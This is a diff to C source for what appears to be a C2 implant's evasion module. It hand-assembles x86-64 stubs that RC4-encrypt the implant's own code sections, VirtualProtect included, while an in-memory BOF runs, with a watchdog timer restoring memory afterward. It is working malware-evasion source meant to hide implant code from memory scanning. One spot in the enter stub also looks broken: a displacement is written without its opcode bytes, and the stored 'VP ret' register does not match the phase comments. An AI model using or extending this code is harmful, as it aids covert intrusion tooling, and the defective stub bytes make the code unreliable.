@@ -88,7 +88,9 @@ typedef struct {
 	unsigned long   text_prot;            /* +0x74 .text original protection  */
 	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x78 */
 	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x80 */
-	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0x88 */
+	volatile LONG   phase;                /* +0x88 crash forensics: 1=VP done
+	                                       * 2=masked 3=BOF done 4=.text back */
+	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0x90 */
 } BW_CTX;
 
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
@@ -101,9 +103,9 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_STATE_CLOSED 2
 
 #define BW_ENTER_OFF 0x000
-#define BW_EXIT_OFF  0x050
-#define BW_WATCH_OFF 0x0A0
-#define BW_CTXQ_OFF  0x110   /* after the watchdog tail-jump data qword */
+#define BW_EXIT_OFF  0x060
+#define BW_WATCH_OFF 0x0C0
+#define BW_CTXQ_OFF  0x140   /* after the watchdog tail-jump data qword */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -410,69 +412,84 @@ static BOOL bw_build_pages(void)
 	memset(g_bw_stubs, 0, 0x1000);
 	p = g_bw_stubs;
 
-	/* ---- enter_stub (called from C, rsp%16==8; .text still plaintext) ----
-	 * sub rsp,8; mov r11,exit; push r11; sub rsp,0x28      -> rsp%16==0
-	 * mov rax,[rip+ctx]
-	 * VirtualProtect(u_text.Buffer, len, PAGE_RW, &ctx->vp_old)   (.text RW)
-	 * sf032(u_text, u_key)          <- .text masked, executing the page
-	 * add rsp,0x28 -> 8
-	 * mov rcx,[ctx->args]; mov edx,[ctx->alen]; jmp [ctx->entry]
+	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
+	 * Stack contract (the first two builds were off by 8: push must land
+	 * exit DIRECTLY in [ret-8], the slot the BOF's ret will pop, and the
+	 * call-alignment pad must match - sub 0x20 after the push, not 0x28
+	 * after a bogus sub 8):
+	 *   push r11(exit)                [ret-8]=exit, rsp%16 -> 0
+	 *   sub rsp,0x20                  rsp%16==0 for the calls below
+	 *   mov rax,[rip+ctx]
+	 *   VirtualProtect(u_text.buf, len32, PAGE_RW, &ctx->vp_old)
+	 *   mov rax,[rip+ctx]             (rax volatile: reload per call group)
+	 *   sf032(u_text, u_key)          <- .text masked, executing the page
+	 *   mov rax,[rip+ctx]
+	 *   add rsp,0x20                  rsp = ret-8 ("call-entered" shape)
+	 *   jmp [ctx->entry]              entry's ret pops exit -> exit_stub;
+	 *                                 exit's ret pops [ret] -> this frame
 	 */
 	e = p + BW_ENTER_OFF;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x08;            /* sub rsp,8 */
-	e += 4;
-	e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 */
+	e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 exit */
 	e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
 	e[0] = 0x41; e[1] = 0x53;                                        /* push r11 */
 	e += 2;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
+	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x20;            /* sub rsp,0x20 */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
-	e += 4;
-	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,4 (PAGE_READWRITE) */
+	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
+	e += 3;
+	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,PAGE_RW */
 	e += 6;
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call [rax+0x78] VP->RW */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RW */
 	e += 3;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0x89; e[1] = 0x48; e[2] = 0x88;                          /* mov [rax+0x88],ecx: VP ret */
+	e += 3;
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] sf032 */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x20;            /* add rsp,0x20 */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* mov rcx,[rax+0x28] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* mov rcx,[rax+0x28] args */
 	e += 4;
-	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* mov edx,[rax+0x30] */
+	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* mov edx,[rax+0x30] alen */
 	e += 3;
-	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] */
+	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
 	e += 3;
-	if ((int)(e - (p + BW_ENTER_OFF)) > 0x50)
+	if ((int)(e - (p + BW_ENTER_OFF)) > 0x60)
 		return FALSE;
 
 	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
 	 * mov rax,[rip+ctx]; mov ecx,2; xchg ecx,[rax]; cmp ecx,1; jne ret
-	 * winner: sf032(.text plaintext again)
-	 *         VirtualProtect(.text, len, ctx->text_prot, &ctx->vp_old)
-	 *         FlushInstructionCache((HANDLE)-1, .text, len)  [cross-core: watchdog]
+	 * winner: sf032(.text plaintext) / reload / VP(.text->orig RX) /
+	 *         reload / FlushInstructionCache(-1, buf, len32)
 	 * ret  (loser path: the watchdog already restored everything)
 	 */
 	e = p + BW_EXIT_OFF;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0xC7; e[1] = 0x40; e[2] = 0x88;                          /* mov dword [rax+0x88],3 */
+	e[3] = 0x03; e[4] = 0x00; e[5] = 0x00; e[6] = 0x00;
+	e += 7;
 	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
 	e += 5;
 	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x36;                                        /* jne ret (+0x36) */
+	e[0] = 0x75; e[1] = 0x4D;                                        /* jne ret (+0x4D) */
 	e += 2;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
@@ -480,33 +497,36 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
-	e += 4;
-	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
+	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
+	e += 3;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
 	e = bw_put32(e + 3, 0x74);
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->orig(RX) */
+	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RX */
 	e += 3;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
 	e += 7;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
 	e += 4;
-	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov r8,[rax+0x50] u_text.Length */
-	e += 4;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
+	e = bw_put32(e + 3, 0x50);
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call [rax+0x80] flush */
 	e = bw_put32(e + 2, 0x80);
 	e[0] = 0xC3;                                                     /* ret */
 	e += 1;
-	if ((int)(e - (p + BW_EXIT_OFF)) > 0x50)
+	if ((int)(e - (p + BW_EXIT_OFF)) > 0x60)
 		return FALSE;
 
 	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
-	 * same claim+restore sequence, then tail-jumps the C rest-unmask:
-	 * sub rsp,0x28; sf032(.text); VP->RX; flush; add rsp,0x28
-	 * mov rcx,rax; jmp [rip+0] -> bw_watchdog_rest  (data qword follows)
+	 * same claim+restore sequence (sub 0x28 for call alignment), then
+	 * reload + mov rcx,rax + tail-jump into the C rest-unmask.
 	 * wd_ret: ret
 	 */
 	e = p + BW_WATCH_OFF;
@@ -518,7 +538,7 @@ static BOOL bw_build_pages(void)
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x4F;                                        /* jne wd_ret (+0x4F) */
+	e[0] = 0x75; e[1] = 0x66;                                        /* jne wd_ret (+0x66) */
 	e += 2;
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
 	e += 4;
@@ -528,38 +548,43 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
-	e += 4;
-	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
+	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
+	e += 3;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
 	e = bw_put32(e + 3, 0x74);
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RX */
 	e += 3;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
 	e += 7;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
 	e += 4;
-	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov r8,[rax+0x50] u_text.Length */
-	e += 4;
+	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
+	e = bw_put32(e + 3, 0x50);
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call flush */
 	e = bw_put32(e + 2, 0x80);
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
 	e += 4;
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
 	e += 3;
 	e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
 	{
-		/* the data qword sits at the instruction end = current e + 6 */
 		unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
-		memcpy(e + 6, &rest, 8);
+		memcpy(e + 6, &rest, 8); /* data qword sits at the instruction end */
 	}
 	e += 14;
 	e[0] = 0xC3;                                                     /* wd_ret: ret */
 	e += 1;
-	if ((int)(e - (p + BW_WATCH_OFF)) > 0x70)
+	if ((int)(e - (p + BW_WATCH_OFF)) > 0x80)
 		return FALSE;
 
 	/* the ctx qword all three stubs load rip-relatively */
@@ -581,6 +606,12 @@ void * bofwin_test_stub_page(void)
 {
 	return g_bw_stubs; /* CI diagnostics: dump the built page, verify the
 	                    * bytes match the capstone mirror offline */
+}
+
+int bofwin_test_phase(void);
+int bofwin_test_phase(void)
+{
+	return (g_bw_ctx != NULL) ? (int)g_bw_ctx->phase : -1;
 }
 
 BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
@@ -637,6 +668,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	ctx->vp_old = 0;
 	ctx->pVirtualProtect = pVP;
 	ctx->pFlushIC = pFlush;
+	ctx->phase = 0;
 	ctx->u_text.Buffer = blocks[text_idx].ptr;
 	ctx->u_text.Length = ctx->u_text.MaximumLength = blocks[text_idx].len;
 	ctx->u_key.Buffer = ctx->key;
@@ -665,6 +697,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		if (i != text_idx)
 			bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 	}
+	ctx->phase = 2; /* all but .text masked */
 
 	/* from here to the exit stub this thread may only touch: stack, ctx
 	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
@@ -672,6 +705,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	 * returns into THIS frame. */
 	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
 	enter();
+	ctx->phase = 4; /* exit stub returned to this frame */
 
 	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
 	 * exit_stub saw state==CLOSED). The image except .text is still
